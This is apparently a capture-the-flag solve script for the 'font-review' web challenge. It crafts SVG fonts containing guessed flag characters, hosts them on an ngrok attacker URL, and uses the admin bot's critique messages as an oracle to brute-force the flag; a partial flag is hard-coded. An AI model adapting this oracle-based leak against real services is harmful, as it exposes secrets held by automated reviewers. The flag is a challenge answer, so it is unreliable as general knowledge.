import requests
import subprocess
import string

ADMIN_URL = "https://font-review.chall.pwnoh.io/"
#ADMIN_URL = "http://localhost:3001/"
ATTACKER_URL = "http://0.tcp.ngrok.io:11925/"

error = [
	"I think your kerning could use some improvement.",
	"The readability of your font might need some attention.",
	"The character spacing in your font could be refined.",
	"Your font's x-height seems a bit inconsistent.",
	"The serifs in your typeface could be more refined.",
	"Consider enhancing the contrast in your font's weights.",
	"The ligatures in your font might benefit from refinement.",
	"Your font's baseline appears slightly uneven.",
	"The italics in your typeface could use some refinement.",
	"The descenders in your font seem a bit too long.",
	"The ascenders in your font could be more consistent.",
	"Consider working on the legibility of your font at smaller sizes.",
	"Your font's uppercase and lowercase letters need better harmony.",
	"The overall style of your font needs more coherence.",
	"I suggest revisiting the spacing between certain letter pairs.",
	"The overall texture of your font could use some improvement.",
]

with open("template.svg") as f:
	template = f.read()

flag = "bctf{l34rn1n6_6r347_6r4ph"
for i in range(50):
	for c in (
		string.ascii_lowercase + string.digits + "_" + string.ascii_uppercase +
		string.punctuation.replace("&", "")
	):
		print("trying", flag + c)
		with open("font.svg", "w") as f:
			f.write(template.replace("FLAG", flag + c))
		subprocess.run(
			["fontforge", "script.fontforge", "font.svg"],
			check=True,
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL
		)
		subprocess.run(
			["python3", "fixfont.py"],
			check=True,
			stdout=subprocess.DEVNULL,
			stderr=subprocess.DEVNULL
		)
		resp = requests.post(ADMIN_URL, data={"url": ATTACKER_URL + "font.woff"}).text
		if any(message in resp for message in error):
			flag += c
			print(flag)
			break
